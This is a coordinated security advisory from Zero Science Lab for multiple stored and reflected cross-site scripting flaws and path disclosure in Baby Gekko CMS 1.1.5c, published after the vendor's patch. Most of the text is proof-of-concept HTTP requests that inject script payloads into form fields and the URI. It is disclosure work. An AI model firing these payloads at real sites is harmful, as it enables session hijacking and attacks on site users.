@@ -1,0 +1,222 @@
+Baby Gekko CMS v1.1.5c Multiple Stored Cross-Site Scripting Vulnerabilities
+
+
+Vendor: Baby Gekko, Inc.
+Product web page: http://www.babygekko.com
+Affected version: 1.1.5c
+
+Summary: BabyGekko strives to deliver high quality websites and other web content
+fast and easy for all end users. It is a lightweight, extensible content management
+system platform for publishing websites, intranets, or blogs.
+
+Desc: Baby Gekko CMS suffers from multiple stored (post-auth) XSS vulnerabilities and
+path disclosure issues when parsing user input to several parameters via GET and POST
+method. Attackers can exploit this weakness to execute arbitrary HTML and script code
+in a user's browser session or disclose the full installation path of the affected CMS.
+
+Overall the vulnerable parameters to XSS are:
+-------------------------------------------
+Reflected (Non-Persistent) XSS:
+
+ 1. username
+ 2. password
+ 3. verification_code
+ 4. email_address
+ 5. password_verify
+ 6. firstname
+ 7. lastname
+
+Stored (Persistent) XSS:
+
+ 8. groupname
+ 9. virtual_filename
+10. branch
+11. contact_person
+12. street
+13. city
+14. province
+15. postal
+16. country
+17. tollfree
+18. phone
+19. fax
+20. mobile
+21. title
+22. meta_key
+23. meta_description
+
+-------------------------------------------
+
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.21
+           PHP 5.3.9
+           MySQL 5.5.20
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            liquidworm gmail com
+                            Zero Science Lab - http://www.zeroscience.mk
+
+
+Vendor status:
+
+[05.04.2012] Vulnerabilities discovered.
+[05.04.2012] Initial contact with the vendor.
+[06.04.2012] Vendor responds asking more details.
+[07.04.2012] Sent details to the vendor.
+[09.04.2012] Vendor replies confirming the issues.
+[10.04.2012] Working with the vendor.
+[02.05.2012] Vendor releases patched version 1.2.0 to address these issues.
+[02.05.2012] Coordinated public security advisory released.
+
+
+Advisory ID: ZSL-2012-5086
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5086.php
+
+Vendor Advisory: http://www.babygekko.com/site/news/general/baby-gekko-v1-2-0-released-with-3rd-party-independent-security-testing-performed-by-zero-science-lab.html
+
+
+05.04.2012
+
+--
+
+
+Stored XSS:
+----------------------------------------------------------------------------------------------
+##############################################################################################
+
+POST http://localhost/gekkocms/admin/index.php?app=users&action=savecategory HTTP/1.1
+
+cid	new
+groupname	"><script>alert(1);</script>
+status	1
+btn_save	Submit
+
+##############################################################################################
+----------------------------------------------------------------------------------------------
+
+POST http://localhost/gekkocms/admin/index.php?app=contacts&action=saveitem HTTP/1.1
+
+btn_save	Submit
+id	new
+category_id	0
+title	Zero Science Lab
+status	1
+virtual_filename	"><script>alert(1);</script>
+branch	"><script>alert(2);</script>
+contact_person	"><script>alert(3);</script>
+street	"><script>alert(4);</script>
+city	"><script>alert(5);</script>
+province	"><script>alert(6);</script>
+postal	"><script>alert(7);</script>
+country	"><script>alert(8);</script>
+tollfree	"><script>alert(9);</script>
+phone	"><script>alert(10);</script>
+fax	"><script>alert(11);</script>
+mobile	"><script>alert(12);</script>
+email	lab@zeroscience.mk
+display_email	0
+additional_info	ZSL
+
+##############################################################################################
+----------------------------------------------------------------------------------------------
+
+POST http://localhost/gekkocms/admin/index.php?app=menus&action=savecategory
+
+cid	new
+title	"><script>alert(1);</script>
+status	1
+btn_save	Submit
+
+##############################################################################################
+----------------------------------------------------------------------------------------------
+
+POST http://localhost/gekkocms/admin/index.php?app=users&action=saveitem HTTP/1.1
+
+id	new
+category_id	4 
+username	test
+password	test
+email_address	a@a.com
+firstname	"><script>alert(1);</script>
+lastname	"><script>alert(2);</script>
+status	1
+btn_save	Submit
+
+##############################################################################################
+----------------------------------------------------------------------------------------------
+
+POST http://localhost/gekkocms/admin/index.php?app=blog&action=saveitem (vulnerable: 6, 7)
+
+date_created	2012-04-05 23:41:09
+date_modified	2012-04-05 23:41:09
+date_available	2012-04-05 23:41:09
+date_expiry	2012-04-05 23:41:09
+options[]	display_pagetitle
+options[]	display_items_summary_noread
+options[]	display_items_author
+options[]	display_items_date_created
+options[]	display_items_date_modified
+permission_read_everyone	everyone
+permission_read[]	1
+permission_read[]	2
+permission_read[]	3
+permission_read[]	4
+permission_read[]	5
+permission_write[]	1
+meta_key	"><script>alert(1);</script>
+meta_description	"><script>alert(2);</script>
+btn_save	Submit
+id	new
+category_id	1
+title	TEST
+status	1
+virtual_filename	testing
+summary	ZSL
+description	Zero Science Lab
+created_by_id	1
+modified_by_id	1
+
+##############################################################################################
+----------------------------------------------------------------------------------------------
+
+
+Reflected URI-Based XSS:
+----------------------------------------------------------------------------------------------
+##############################################################################################
+
+GET /gekkocms/admin/index.php/"><script>alert(1);</script> HTTP/1.1
+
+##############################################################################################
+----------------------------------------------------------------------------------------------
+
+
+Reflected XSS:
+----------------------------------------------------------------------------------------------
+##############################################################################################
+
+POST http://localhost/gekkocms/users/action/register HTTP/1.1
+
+_csrftoken	b9fe8295484875cda8fc84393151b97b10feeef2
+username	EdwardNigma
+email_address	lab@zeroscience.mk
+password	"><script>alert(1);</script>
+password_verify	"><script>alert(2);</script>
+firstname	"><script>alert(3);</script>
+lastname	"><script>alert(4);</script>
+submit	Submit
+
+##############################################################################################
+----------------------------------------------------------------------------------------------
+
+
+Path Disclosure:
+----------------------------------------------------------------------------------------------
+##############################################################################################
+
+GET http://localhost/gekkocms/admin/templates/babygekko/index.php HTTP/1.1
+GET http://localhost/gekkocms/templates/html5demo/index.php HTTP/1.1
+
+----------------------------------------------------------------------------------------------
+##############################################################################################
